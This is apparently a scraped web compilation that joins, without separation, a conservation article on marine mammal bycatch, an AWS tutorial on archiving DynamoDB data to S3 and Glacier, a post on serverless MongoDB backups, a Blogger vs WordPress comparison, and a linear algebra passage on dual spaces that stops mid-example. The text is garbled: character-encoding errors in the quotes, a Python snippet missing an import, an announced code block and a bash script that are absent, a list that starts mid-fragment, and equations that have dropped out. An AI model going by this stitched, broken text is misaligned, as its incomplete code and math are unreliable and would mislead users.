<p>Globally, fishing gear kills <a href="https://www.sciencedirect.com/science/article/pii/B9780123735539000444" target="_blank">at least 300,000 marine mammals</a> every year, and leaves many more individuals with scars both physical and psychological. Some governments, including those of the U.S. and E.U., may temporarily close fisheries or regulate gear after a specified number of marine mammals are killed, but those measures are limited. At a moment when the cruel captivity of several dozen orcas inspires public outrage and aquarium boycotts and new laws, the global fishing industry and its regulators generally accept the widespread killing and maiming of marine mammals as a part of doing business. And so we unwittingly continue to eat fish, in huge amounts, and marine mammals continue to suffer.</p>
<p>Dolman says present approaches, which focus on maintaining specific populations above a minimum size, still allow too much killing and preventable suffering. She says itâ€™s time for fisheries policies to consider the welfare of individual whales and dolphins and other marine mammals. â€œBeing caught in fishing gear is a horrible way to die,â€� says Dolman. â€œHow would the public feel about this when theyâ€™re eating fish and seafood, if they knew about these animalsâ€™ suffering? We need another solution.â€�</p>
<p>Dolman and her colleague Philippa Brakes, a research fellow at Whale and Dolphin Conservation, outlined their approach for regulating â€œbycatch,â€� as unintentionally caught animals are called, and preventing entanglement in fishing gear in a <a href="https://www.frontiersin.org/articles/10.3389/fvets.2018.00287/full" target="_blank">2018 paper</a> published in the journal <em>Frontiers in Veterinary Science</em>. They say that fisheries policies must account for the well-being of individuals, not just populations, ideally with zero tolerance for marine mammal bycatch.</p>
<p>They also argue for updating the definition of â€œsustainableâ€� fisheries, now set according to whether the exploitation of a given fish population can be continued without jeopardizing it, to include marine mammals killed as bycatch. In their paper, Dolman and Brakes point out that â€œbuying â€˜sustainableâ€™ fish or indeed some fish products labeled â€˜dolphin-friendlyâ€™ provide no guarantees that incidental bycatch of protected species does not occur alongside the targeted catch.â€�&nbsp; And not only should sustainability encompass mortality, but also the suffering of survivors—something thatâ€™s a bit more challenging to measure, though scientists acknowledge that itâ€™s real, and goes beyond the pain of scars and severed limbs caused by the constricting ropes of the gear they carry.</p><figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_911411818e26b80488c996ad7cfe7d4d.jpg" alt="nautilus whale calf"><figcaption><span>A humpback whale mother swims with her newborn calf in their traditional breeding waters in the Hawaiian Islands Humpback Whale National Marine Sanctuary. </span><br><span>Credit: NOAA News</span></figcaption></figure><p>Even if we are quite far from fully understanding the experiences of animals who spend their lives primarily underwater, <a href="https://link.springer.com/chapter/10.1007/978-3-030-31011-0_10" target="_blank">research clearly reveals</a> that harbor porpoises like the one whose cries haunted Dolman and other marine mammals are, like us, highly intelligent and social creatures. Ecologist and author <a href="https://www.nytimes.com/2015/08/04/science/review-beyond-words-carl-safina.html" target="_blank">Carl Safina</a>, who has written extensively about the inner lives of nonhuman animals including orcas and sperm whales, says the loss of even one individual whale—particularly if she happens to be an adult female—can be catastrophic for others.<br></p>
<p>â€œSperm whales stay together their entire lives, very intentionally living together in a family the way elephants live together in a family,â€� says Safina. â€œIf you lose even one member of that female support group, you increase the risks and hazards to the young ones.â€�&nbsp;</p>
<p>Like baby humans, young marine mammals depend on their eldersâ€™ vigilance and protection, as well as their practical knowledge and cultural wisdom, for survival. Older animals in a family bestow younger members with all sorts of knowhow, such as what to eat and how to hunt for food. Scientists have discovered that <a href="https://science.sciencemag.org/content/337/6100/1313" target="_blank">orca grandmothers</a> play an outsized role in the lives of young orcas, boosting youngstersâ€™ chances of survival. Even for less family-oriented marine mammal species, like humpback whales, notes Safina, â€œthe death of a mother—or severe distress of a mother due to entanglement in fishing gear—can be, depending on age of a young one, completely devastating or very stressful.â€�
</p>
<p>Research like this â€œopens a rich seam of understanding,â€� Brakes says. â€œSuch understanding shows us that we can no longer treat marine mammals like a homogenous group or numbers on a spreadsheet.â€� She and Dolman propose a multi-pronged strategy of implementing fisheries closures and new fishing practices, as well as requiring new gear that minimizes bycatch and entanglements. Fisheries regulation would need to include enhanced monitoring and reporting systems that keep track of every harmed marine mammal. Right now basic data about bycatch and entanglements, much less the long-term physiological and psychological affects, are not being collected.</p>
<blockquote>â€œWe can no longer treat marine mammals like a homogenous group or numbers on a spreadsheet.â€�</blockquote>
<p>According to Dolman, the Marine Stewardship Council (MSC), a key independent labeler of sustainable seafood, has received much criticism in recent years about its inadequate consideration of bycatch. â€œMSC bycatch standards are under review at the moment,â€� Dolman said. â€œThis is something thatâ€™s long overdue. But, I have to say, Iâ€™m not feeling very positive about whatâ€™s coming. The fishing industry is very vocal and oppositional to regulatory change. Consumers and scientists must begin pushing for laws and certification schemes to seriously incorporate welfare into the â€˜sustainableâ€™ label. Most of the public feels comfortable when they see a dolphin-safe label—though really, right now, they shouldnâ€™t.â€�<strong>
</strong></p>
<p>Adding to marine mammalsâ€™ collective challenges is the fact that fishing isnâ€™t their only threat. In addition to depleting populations of the fish they eat, humans have made the oceans a much noisier place, with engine noise and seismic surveys and naval tests causing both chronic stress and acute damage. We push ship traffic into ever-more remote areas once only known to marine animals; disrupt marine life by developing coastlines and dredging channels; pollute with plastic and toxic chemicals; and cause ocean-warming climate change.
</p>
<p>These are not matters to frame purely in terms of populations and environments, but the lived experiences of animals who share many intellectual properties with us. â€œPeople need to understand that other living things can suffer and that these individuals donâ€™t want to suffer. They want to exist in a state of wellbeing. Thatâ€™s what they strive to do,â€� says Safina. â€œI think the big first step is for people to understand and talk about that and drive away from things that cause suffering.â€�</p>

  <p><span>07 Aug 2020</span></p><p>AWS offers a variety of general purpose storage solutions. While DynamoDB is the best option when latency and a variety of access patterns matter most, S3 allows for cost reduction when access patterns are less complex and latency is less critical.</p>

<p>This article describes the available options for archiving data, how to prepare that data for long term archival and how to let S3 transition data between storage tiers.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_storage_vs_latency.png" alt="Storage Price vs Latency"></p>

<p>Below you find a table comparing the prices and access latencies as of August 2020.</p>



<p>All prices are for us-east-1. This article focuses on storage cost only.</p>

<h2 id="prerequisites">Prerequisites</h2>

<p>You should have an <strong>AWS account</strong> and gained <strong>first experience with DynamoDB or S3</strong>. The code snippets are written in Python and are intended to run on <strong>AWS Lambda</strong>.</p>

<h2 id="moving-data">Moving Data</h2>

<p>As you’ve seen in the previous table, you can achieve significant storage cost reduction, by moving your data to a cheaper storage solution.</p>

<p>There are 3 major paths when archiving data:</p>

<ol>
  <li>DynamoDB to S3</li>
  <li>S3 Storage Tiers</li>
  <li>Final Archival with S3 Glacier</li>
</ol>

<p>The first path requires a lambda function, and the others can be achieved without additional glue code. We will however look at data aggregation for small objects, as infrequent access solutions are less suitable for small objects.</p>

<h3 id="dynamodb-to-s3">DynamoDB to S3</h3>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_badge_1.png" alt="Badge for DynamoDB to S3"></p>

<p><strong>When to move data from DynamoDB to S3</strong></p>

<p>Moving data out of DynamoDB makes sense when that data is becoming stale, but remains interesting for future use cases.</p>

<p>An example for this are performance metrics. We’re most interested in the recent weeks, but don’t look at data from months ago too much. We still want to keep those around for later analysis or troubleshooting.</p>

<p><strong>How to move data from DynamoDB to S3</strong></p>

<p>To move data from DynamoDB to S3, we can use DynamoDB’s Time to Live (ttl) feature in combination with event streams. This approach requires four steps:</p>

<ol>
  <li>Specifying a ttl attribute on a DynamoDB table</li>
  <li>Adding a timestamp to records which shall expire</li>
  <li>Activating a stream that DynamoDB will emit deleted records to</li>
  <li>Attaching a lambda to this stream, which checks for <code>DELETE</code> events and writes the records into an S3 bucket</li>
</ol>

<p>The first three steps are covered in my article <a href="https://bahr.dev/2020/02/02/aggregate-ddb/">How to analyse and aggregate data from DynamoDB</a>.</p>

<p>The lambda function to transition records to S3 can be as short as the following snippet:</p>

<div><div><pre><code><span>from</span> <span>datetime</span> <span>import</span> <span>datetime</span>
<span>import</span> <span>boto3</span>
<span>s3</span> <span>=</span> <span>boto3</span><span>.</span><span>resource</span><span>(</span><span>'s3'</span><span>)</span>

<span>def</span> <span>handler</span><span>(</span><span>event</span><span>,</span> <span>context</span><span>):</span>
    <span>for</span> <span>record</span> <span>in</span> <span>event</span><span>.</span><span>get</span><span>(</span><span>'Records'</span><span>,</span> <span>[]):</span>
        <span>if</span> <span>record</span><span>[</span><span>'eventName'</span><span>]</span> <span>!=</span> <span>'DELETE'</span><span>:</span>
            <span>return</span>
    
        <span>payload</span> <span>=</span> <span>record</span><span>[</span><span>'dynamodb'</span><span>][</span><span>'NewImage'</span><span>]</span>
        <span># this assumes that there is a partition key called Id 
</span>        <span># which is a number, and that there is no sort key
</span>        <span>key</span> <span>=</span> <span>record</span><span>[</span><span>'dynamodb'</span><span>][</span><span>'Keys'</span><span>][</span><span>'Id'</span><span>][</span><span>'N'</span><span>]</span>

        <span>date</span> <span>=</span> <span>datetime</span><span>.</span><span>now</span><span>().</span><span>isoformat</span><span>()</span>

        <span>object_key</span> <span>=</span> <span>f"data-from-dynamodb/</span><span>{</span><span>date</span><span>}</span><span>/</span><span>{</span><span>key</span><span>}</span><span>"</span>
        <span>body</span> <span>=</span> <span>json</span><span>.</span><span>dumps</span><span>(</span><span>payload</span><span>).</span><span>encode</span><span>()</span>
        <span>s3</span><span>.</span><span>Object</span><span>(</span><span>'my_bucket'</span><span>,</span> <span>object_key</span><span>).</span><span>put</span><span>(</span><span>Body</span><span>=</span><span>body</span><span>)</span>
</code></pre></div></div>

<p>This will store deleted records in the S3 bucket <code>my_bucket</code>. No data is lost, the DynamoDB table stays small and you get an instant 90% cost reduction on storage.</p>

<h3 id="s3-storage-tiers">S3 Storage Tiers</h3>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_badge_2.png" alt="Badge for S3 Storage Tiers"></p>

<p><strong>If your data is accessed infrequently</strong> you can achieve further cost savings by picking the right storage tier.</p>

<p>S3 Lifecycle Transitions allow us to move objects between storage tiers without them leaving the S3 bucket. We define rules where we specify which storage tier an object shall be moved to once it reaches a certain age.</p>

<p><img src="https://docs.aws.amazon.com/AmazonS3/latest/dev/images/lifecycle-transitions-v2.png" alt="S3 Transition Paths"></p>

<p>You can read all about the S3 lifecycle transitions on the <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/lifecycle-transition-general-considerations.html">official AWS documentation</a>.</p>

<p><strong>When to move data between S3 tiers</strong></p>

<p>S3 Standard gives you the most reliability and fastest access speed. If you’re okay with 99.9% availability or you only access your data rarely (e.g. for regulatory checks), then the non-standard tiers can give you a cost advantage. The durability of your data is not affected (unless you pick the One-AZ tier).</p>

<p>You also should aggregate data before moving it to a storage tier other than S3 Standard or S3 Intelligent-Tiering, as there is a <a href="https://aws.amazon.com/s3/storage-classes/">minimum capacity charge per object</a>. As a rule of thumb, aggregate your objects until the result is at least 1MB.</p>

<p><strong>How to move data between S3 tiers</strong></p>

<p>Due to the minimum capacity charge we will <strong>start by aggregating data</strong>. If all of your objects in S3 are already 1MB or more, then you can skip directly to the lifecycle rules. To aggregate objects we can use any compute service (EC2, Fargate, Lambda) to load objects from S3, aggregate them and write the aggregated data back.</p>

<p>This code snippet uses <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3.html">boto3</a> and loads all records from the folder <code>data-from-dynamodb/2020-07</code>, aggregates them, deletes the old data and uploads the new data into the folder <code>aggregated</code>.</p>

<p>Now that we’ve packaged our objects, let’s continue with <strong>lifecycle transitions</strong>. S3 can be configured to automatically move objects between storage tiers.</p>

<p>In this article we will configure the lifecycle transitions through the AWS console. You can also use the CDK’s <a href="https://docs.aws.amazon.com/cdk/api/latest/docs/@aws-cdk_aws-s3.LifecycleRule.html">LifecycleRules</a> and <a href="https://docs.aws.amazon.com/cdk/api/latest/docs/@aws-cdk_aws-s3.Transition.html">Transition</a>s to build an Infrastructure as Code solution.</p>

<p>To get started, open your S3 bucket in the AWS console and open the Management tab. Click on “Add lifecycle rule” to configure a lifecycle. By applying the lifecycle rule to the folder <code>aggregated</code>, we only transition data which has been packaged for archival.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_step_1.png" alt="Lifecycle Rules Step 1"></p>

<p>Specify a Transition to Standard-IA (Infrequent Access) after 30 days. We’re assuming here that data will be archived and therefore infrequently accessed, but you can increase this number however you like or pick another storage tier.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_step_2.png" alt="Lifecycle Rules Step 2"></p>

<p>Review and complete the lifecycle rule.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_step_3.png" alt="Lifecycle Rules Step 3"></p>

<p>After 30 days you should start see in your bill that some objects are now priced at a less expensive storage tier. If you picked S3 Infrequent Access, that’s another 45% you save for storage.</p>

<h3 id="data-on-ice-with-s3-glacier">Data on Ice with S3 Glacier</h3>

<p>While we’re only looking at Glacier here, you can apply the same principles for moving data to Intellingent-Tiering, One Zone-IA and Glacier Deep Archive.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_badge_3.png" alt="Badge for S3 Glacier"></p>

<p><strong>When to move data to Glacier</strong></p>

<p>S3 Glacier and S3 Glacier Deep Archive become interesting options, when you need to store data for a very long time (+5 years) and only access it very rarely (1-2 a year or less).</p>

<p><strong>How to move data to Glacier</strong></p>

<p>As we’ve previously aggregated our data, we can add additional lifecycle transitions to move the data from S3 Infrequent Access to S3 Glacier. Instead of the Infrequent Access tier, now pick a Glacier option and adjust the time before transition accordingly.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_glacier.png" alt="Lifecycle Rule Glacier"></p>

<p>That’s it. Your data is now on ice and we get an additional 68% cost reduction on storage.</p>

<p><strong>How to retrieve data from Glacier</strong></p>

<p>To access data that is stored in Glacier, <a href="https://docs.aws.amazon.com/AmazonS3/latest/user-guide/restore-archived-objects.html">you have to restore a copy of the object</a>. The copy will be available for as long as you specified. The retrieval however can take up to 12 hours.</p>

<h2 id="next-steps">Next Steps</h2>

<p>Do you have big DynamoDB tables? Figure out what data you can archive, and start moving it to S3 for a 90% cost reduction!</p>

<p>Do you already have data in S3? Add a lifecycle transition to a lower tier and aggregate objects if needed.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Even if I consider myself a Serverless fanboy I listen to all the arguments <em>against</em> it and I have to agree some of them are valid. Heck, that’s true for basically every technology: they all come with <em>pros</em> and <em>cons</em>.</p><p>One of the most valuable benefits I see in Serverless and I believe hard to confute though is, well… that less toil work dedicated to server administration means that as an engineer you can focus on arguably more valuable tasks at hand and, probably, the end result of what you build will be a more robust and reliable infrastructure too.</p><p>Take this case for example: perform daily backups of remote (i.e. fully managed, no shell access) MongoDB instance, store these archives somewhere offsite and delete them once they are older than a defined amount of time. I’m sure if you’ve ever did system administration (or call it <em>DevOps</em> if you prefer) this sounds like a very familiar kind of task, doesn’t it?</p><h2 id="a-conventional-approach">A conventional approach</h2><p>In the old days, when Serverless was not yet a thing, a common way to approach this was to:</p><ol><li>setup some <em>admin</em> or <em>ops</em> kind of server responsible for this and most probably other kind of similar back-office activities. No need to say you and your team also need to take good care of it for the forseeable future (i.e. have redundant storage drives in some kind of RAID scheme and replace them once they fail, keep the server itself backupped, monitor that it’s up and running 24/7, etc)</li><li>set up some kind of cronjob to do the above backup routine every evening (or every X amount of time, depending on the needs, etc)</li><li>in the same above cronjob or as an independent task, have some kind of <em>pruning</em> process that takes care of deleting old archives once their expiry date has passed</li></ol><h2 id="a-serverless-approach">A Serverless approach</h2><p>Instead, in this article I’m going to show you how this very same problem might be approached from a Serverless perspective. These are the tools I’m going to use:</p><ul><li>AWS S3 for storing the archives and automatically prune them after they are older than 7 days</li><li>AWS Fargate for executing a <code>mongodump</code> process (wrapped by a few lines of Bash) in a <em>Docker container</em> and upload the generated archive to an S3 bucket</li><li>AWS CloudWatch Events to trigger the routine in a <em>cron</em> fashion (in my case every day at 23:50)</li><li>AWS CDK to easily setup all the above, including ECS cluster and auto-generated <em>least-privilege</em> IAM policies and so forth</li></ul><h2 id="show-me-the-code">Show me the Code</h2><p>This is a slightly simplified overview of the application:</p><p><img src="https://a.l3x.in/blog/mongodb-backups-with-aws-cdk/mongodumper_stack.png" alt="Stack diagram"></p><p>The AWS CDK stack (including Dockerfile and Bash script) is <a href="https://github.com/shaftoe/api-l3x-in/tree/0.13.0/lib/stacks/mongodumper">available on GitHub</a>. I copy here the basic Bash script which is responsible for the actual work, all the rest is fairly simple <a href="https://github.com/shaftoe/api-l3x-in/tree/0.13.0/lib/stacks/mongodumper/__init__.py">CDK plumbing</a>:</p><div><pre><code data-lang="bash"><span>#!/bin/bash

</code></pre></div><p>The command pipe at line 11 should already suffice as <code>CMD</code> for Docker (i.e. there’s no real need for a Bash wrapper to have it work) but in this way in case of failures I’m confident I’ll get an <code>ERROR:</code> string in the relative CloudWatch Logs Group and I’ll be notified about that.</p><p>For instance, I receive a daily email report with error logs present in every CloudWatch Log group and in my case I consider this enough as a form of monitoring but depending on your scenario you might want to setup some kind of specific monitoring for the S3 archive bucket.</p><p>You might want to also have a look at <a href="https://a.l3x.in/blog/add-pagespeed-check-with-serverless/">this older article</a> for hints and suggestions on how to develop a more detailed monitoring AWS-based solution.</p><h2 id="pitfalls-and-caveats">Pitfalls and Caveats</h2><p>The above solution took little time to be developed and it’s been working like a charm since it went into production.

</code></pre></div><p>I even tried to open a bug report on MongoDB official tracker but I couldn’t manage to have a working account: I could sign up but I can’t login, I even tried password resets with no luck… oh well, at least they can’t tell me I haven’t tried. By the way, I’ve worked around this using <code>debian:buster-slim</code> as Docker base image given that I don’t care that much about image size anyway, my AWS bill is basically unaffected by a few more MBs stored in the ECS registry so what the heck</p></li><li><p>every single time a Fargate task is executed without explicitly setting a security group <strong>will create a brand new one</strong> and, given that there’s a quota of <a href="https://docs.aws.amazon.com/vpc/latest/userguide/amazon-vpc-limits.html">maximum 2500 security groups per region</a>, this might very well cause a few headaches in the close future unless properly addressed. To avoid that I explicitly set the Fargate Task to use the default VPC security group which has open <code>EGRESS</code> rules and works fine in my scenario, it’s implemented at at <a href="https://github.com/shaftoe/api-l3x-in/tree/0.13.0/lib/stacks/mongodumper/__init__.py#L66">line 66</a> of the CDK stack. I believe this is a more sensible default behavior and I hope ECS developers will address this in the future, I bet some user might not be as lucky as I’ve been to notice it before deploying to production and discover it the hard way</p></li><li><p>another annoying default setting in ECS: when running a Fargate Task in a public VPC subnet the container won’t receive proper networking setup unless explicitly set, i.e. it will not be able to pull the image from the ECS registry, hence it will never reach the <code>RUNNING</code> stage and, even worse, no error log will be sent to CloudWatch Logs.</p><p>Unfortunately CDK doesn’t let you change this setting for CloudWatch Events yet, there’s an <a href="https://github.com/aws/aws-cdk/issues/9233">open feature request</a> for that and given the recent speed of development in the CDK project I expect this to be solved soon.</p><p>For the time being I worked around it manually changing the setting via the web console (yeah, I know, <em>the horror</em> 😱), another way around it that doesn’t require manual intervention and makes the solution 100% <em>Infra as Code</em> would have been to put a Lambda proxy between the CloudWatch Event and the Fargate task. It might be I’ve been either too lazy or too optimistic in CDK fixing this promptly, only time will tell</p></li><li><p>currently the above solution supports storing archives for a single (MongoDB) database, it should be fairly trivial to extend it to support multiple databases though (e.g. defining multiple CloudWatch Events, each one setting different <code>MONGODB_URI</code> value via <code>container_overrides</code> parameter)</p></li><li><p>for my simple need a <em>delete permanently after 7 days</em> bucket lifecycle policy is all right, you might want to consider more complex policies like storing old archives to Glacier instead, S3 is <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/object-lifecycle-mgmt.html">quite flexible</a> in that regard</p></li></ul><h2 id="wrapping-up">Wrapping Up</h2><p>Once more I’m delighted by how easy it is to work with CDK on AWS and I have the feeling those solutions I come up with are simple, robust, and basically require zero maintenance from my side (which is gold in itself).</p><p>Comparing the above solution to a more conventional approach which might require maintaining (and monitoring! and keeping secured! etc.) a server 24/7 for running actual work only for a few seconds per day is… wasteful, to say little.</p><p>Beside, I bet today there’s no way to come up with a cheaper production-ready solution: a few seconds of Fargate execution per day won’t even show up in the AWS monthly bill, and if it does it might be for just a few Euro (or Dollar) cents. Of course this might not be true in case of big datasets where the cost for S3 storage/data transfer might make an in-house solution (or even better, a fully managed solution, automated backups included) more cost effective, but I bet this is never going to be the case in many real scenarios where archives are relatively small sized (i.e. a few GBs or so).</p><p>That said, the current shortcomings in the integration between ECS and CDK are annoying and enforce the <em>Serverless is not 100% ready for production</em> argument validity, at least for the time being.</p><p>I hope you enjoyed reading this article at least a fraction of how much I did while working on it, and don’t forget to let me know what you think.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
							
<p>Blogger vs WordPress which platform is better? This has been a recurring question asked by many users of these two platforms. We have decided to deal with this question once and for all.</p>
<p>Note that this comparison is based on self-hosted WordPress and free Blogger platform; and not between WordPress.com and Blogger. Let’s go into the meat of the matter.</p>
<hr>
<h2>Table of Contents</h2>
<ul>
<li>The ownership of each platform</li>
<li>Control of platform</li>
<li>Look and Feel</li>
<li>Portability of Blogger vs WordPress</li>
<li>Security of WordPress vs Blogger</li>
<li>Level of support for each platform</li>
<li>Set up</li>
<li>Versatility</li>
<li>Customization</li>
<li>Software Updates</li>
<li>Conclusion</li>
</ul>
<hr>
<h2>The ownership of each platform</h2>
<p>Blogger and its blogspot.com domain are both free services owned and controlled by the almighty Google. The disadvantage of this is that you do not have any control over this platform if you publish your blog on Blogger. Google can decide to shut down your blog and you will be left to start all over again. Your content is gone.</p>
<p>On the other hand, WordPress is an open source platform; which means the software is free. It is also <a href="https://www.edopedia.com/blog/best-cheap-web-hosting-services/" data-wpel-link="internal" rel="follow">self-hosted</a>. You can have your domain name like www.myblog.com and host it. The advantage here is that you own the domain and the contents. You can decide to renew the ownership yearly or not.</p>
<hr>
<h2>Control of platform</h2>
<p>Blogger has got limited control, unlike WordPress which has unlimited control. Blogger is not flexible because the tools available are limited. For instance, in WordPress you can use plugins to give your blog different features and make it a lot more useful; you do not have such luxury with Blogger. For example: In WordPress you have the ability to convert a blog to an <a href="https://www.edopedia.com/blog/best-free-wordpress-ecommerce-plugins/" data-wpel-link="internal" rel="follow">online store</a> with just a plugin. This is how flexible WordPress is.</p>
<hr>
<h2>Look and Feel</h2>
<p>Let’s discuss the look and feel of these platforms. By “look and feel”, we are referring to appearance. Blogger has got very beautiful appearance but the constraint is that you cannot modify or extend it by adding more layouts on the default template. You just have to use the default template just the way it is.</p>
<p>For WordPress, it is easy to extend the layouts using a <a href="https://www.edopedia.com/blog/free-wordpress-page-builder-plugins/" data-wpel-link="internal" rel="follow">page builder plugin</a>. You can find themes for different types of websites with WordPress; it’s not so for Blogger.</p>
<hr>
<h2>Portability of Blogger vs WordPress</h2>
<p>You are at great risk when you use Blogger and you decide to move your content to another platform. For instance, moving Blogger to WordPress could make you lose a lot such as domain authority and your <a href="https://www.edopedia.com/blog/best-free-wordpress-seo-plugins/" data-wpel-link="internal" rel="follow">Search Engine Optimization (SEO)</a> ranking.</p>
<p>Whereas WordPress is super easy to move. You can easily move from one <a href="https://www.edopedia.com/blog/best-cheap-web-hosting-services/" data-wpel-link="internal" rel="follow">hosting platform</a> to another with ease. You can even decide to change the domain name, yet, it will still be a jolly ride even if you want to move to another platform entirely.</p>
<hr>
<h2>Security of WordPress vs Blogger</h2>
<p>One great advantage of using Blogger is that it is quite secure since it is powered by Google. They have enough server resources for the proper functioning of your blog. You don’t have to spend money to increase the disk space or bandwidth. You do not have to worry about backing up of your content. No worries about security too. Google basically takes care of all of that for you.</p>
<p>While WordPress is secure by default but you still have to add more <a href="https://www.edopedia.com/blog/best-free-wordpress-security-plugins/" data-wpel-link="internal" rel="follow">security features</a> so as to make sure that your blog has a multi-layered security. You have to <a href="https://www.edopedia.com/blog/best-free-wordpress-backup-plugins/" data-wpel-link="internal" rel="follow">back up your content</a> because the web server can crash at any time and if that happens, you would just move your blog content to another web server. There are hundreds of plugins available to give your blog extra security when you are using WordPress.</p>
<hr>
<h2>Level of support for each platform</h2>
<p>When it comes to support, what you get with Blogger is restricted. There is a forum and also documentation for Blogger users. Blogger’s support does not go beyond this.</p>
<p>WordPress, on the other hand, has a myriad of support for users. WordPress has a dynamic support system that is very active such as forums, documentation and an online support. You can easily get assistance from these various support options. Aside from that, you can also get excellent paid support if you are using a premium theme. There are also free themes with a wonderful support.</p>
<hr>
<h2>Set up</h2>
<p>If we talk about how to set up these two platforms then it is a lot easier to configure a WordPress blog compared to Blogger. Once you have a hosted domain, you just <a href="https://www.edopedia.com/blog/how-to-create-a-wordpress-website/" data-wpel-link="internal" rel="follow">install WordPress with one click</a> and customize it. It’s that easy.</p>
<p>Blogger requires you to have an account before setting up. But a point to be noted is that you can have many blogs under one account.</p>
<hr>
<h2>Versatility</h2>
<p>WordPress is very versatile than Blogger. With WordPress, you can convert a blog to an online store or add portfolios without any stress.</p>
<p>For Blogger, a default template can only be used for a specific purpose. To design an online store or a blog with Blogger, you have to choose a template made for it. Basically, you can’t convert a blog template to work as an <a href="https://www.edopedia.com/blog/best-free-ecommerce-wordpress-themes/" data-wpel-link="internal" rel="follow">online ecommerce store</a>.</p>
<hr>
<h2>Customization</h2>
<p>There are limitations when it comes to customizing Blogger but there are no limitations for WordPress. You have unfettered control over the appearance of your WordPress blog or website.</p>
<hr>
<h2>Software Updates</h2>
<p>Updates are automatic in Blogger. For WordPress, there are some automatic updates but mostly you have to manually upgrade the version of your plugins and themes.</p>
<hr>
<h2>Conclusion</h2>
<p>When you talk about WordPress vs Blogger, WordPress beats Blogger hands down in many ways. The flexibility of WordPress over Blogger is so outstanding. WordPress is the world’s most used platform powering more blogs and websites than any other platform.</p>
<p>The fact that you do not own Blogger as a platform is a great disadvantage. One major disadvantage of WordPress is that you have to buy a domain and hosting while Blogger costs you nothing.</p>
<p>One distinguished advantage of WordPress is that it is open source which means it is not owned by anyone and you do not have to depend on a company or organization to make it work, unlike Blogger where you have to depend on Google for everything.</p>
<p>WordPress gets better every day because there are communities of developers working on it while Blogger has not undergone any outstanding updates for some time.</p>
<p>Blogger vs WordPress; the choice is now yours. Good luck!</p>

<p>When I was learning about Continuum Mechanics for the first time, the <em>covariance
and contravariance of vectors</em> confused the hell out of me. The concepts gain
meaning in the context of Riemannian Geometry, but it was surprising to find
that one doesn’t need to learn an entire subject to grasp the logic behind
co-/contravariance. An intermediate knowledge of linear algebra is enough—that
is, one has to be acquainted with the concept of vector spaces and one-forms.</p>
<p>The duality of co-/contravariance arises when one has to define vectors in terms
of a non-orthonormal basis. The reason such terminology doesn’t show up
in engineering education is that Cartesian coordinates are enough for most
engineering problems. But every now and then, a complex problem with funky
geometrical requirements show up, like one that requires measuring distances and
areas on non-flat surfaces. Then you end up with dual vector spaces. I’ll try to
give the basics of duality below.</p>
<p><strong>Definition:</strong> Let $\CV$ be a finite-dimensional real vector space.
The space $\CV^\ast = \CL(\CV,\IR)$,
defined as the
the space of all one-forms $\Balpha:\CV\to\IR$, is called the
<strong>dual space</strong> to $\CV$.</p>
<p>Let $B=\cbr{\Be_1,\dots,\Be_n}$ be a basis of $\CV$. Any vector $\Bv\in\CV$ can be written
in terms of $B$ as</p>

<p>with the components $a_1,\dots,a_n\in\IR$.
For any $i=1,\dots,n$, we can define the $i$-th component $a_i$ by a one-form as</p>

<p>These elements are linear and thus are in the space
$\CL(\CV,\IR)$<sup id="fnref:1"><a href="#fn:1">1</a></sup>.
Given any basis $B=\setveci{\Be}$, we call $B^\ast = \setveciup{\Be}$
the basis of $\CV^\ast$ <strong>dual</strong> to $B$.
The fact that $B^\ast$ really is a basis of $\CV^\ast$ can be proved
by showing that $\Be^i$ are linearly independent.
Then $\Bv$ has the following
representation</p>

<p>Instead of $a_i$, it is practical to denote the components of $\Bv$ as $v^i$,
lightface of the same symbol with a raised index corresponding to
the raised index of the dual basis:</p>

<p>In fact, this convention is more compatible with
the symmetry caused by the duality.
This point will be more clear after the introduction of
dual basis representation of one-forms.</p>
<p><strong>Proposition:</strong> Each $\Be^i \in \CL(\CV,\IR)$ can be identified by its action on the basis
$B$:</p>

<p><strong>Proof:</strong> For any $\Bv\in\CV$, $\Be^i(\Bv)$ must give $v^i$, the
$i$-th component of $\Bv$.
Setting $\Bv = \Be_j$, one sees that
$\Be^i(\Bv)=v^i = 1$ when $i=j$, and is zero otherwise.</p>
<p>Geometrically, \eqref{eq:dualbasis2} implies that a basis vector is
perpendicular to all the dual basis vectors, except its own dual.</p>
<h2 id="dual-basis-representation-of-one-forms">Dual Basis Representation of One-Forms</h2>
<p>Let $\Balpha$ be a one form in $\CV^\ast$ with the corresponding
dual basis $\setveciup{\Be}$. Then similar to a vector,
$\Balpha$ has the following representation</p>

<p>where the <strong>components of the one-form</strong> $\Balpha$
are defined as</p>

<p><strong>Proof:</strong> We substitute \eqref{eq:vectorrep2} and obtain</p>

<p>using $\Balpha$’s linearity.</p>
<p><strong>Notation:</strong>
Let $\CV$ be a finite-dimensional real vector space.
For $\Bv\in\CV$ and $\Balpha\in\CV^\ast$</p>

<p>denotes the action of $\Balpha$ on $\Bv$, and is called
a <strong>natural pairing</strong> or <strong>dual pairing</strong>
between a vector space and its dual.
<em>It is of the essence to understand that $\abrn{\cdot,\cdot}$ does not
denote an inner product in $\CV$</em>; that is,
$\abr{\Bv,\Balpha}$ means $\Balpha(\Bv)$.</p>
<p>With this notation, \eqref{eq:vectorrep2} can be written as</p>

<p>and \eqref{eq:dualbasis2} as</p>

<p>Using the convention that $\Be_i$ are column vectors and
$\Be^i$ are row vectors,
\eqref{eq:dualbasis1} can be rearranged in the following manner</p>

<p>which can be used to compute a dual basis.</p>
<p><strong>Example:</strong> Given a two-dimensional vector space $\CV$ with a basis
$\Be_1=[2,-0.5]\tra$, $\Be_2=[1,1]\tra$, we use
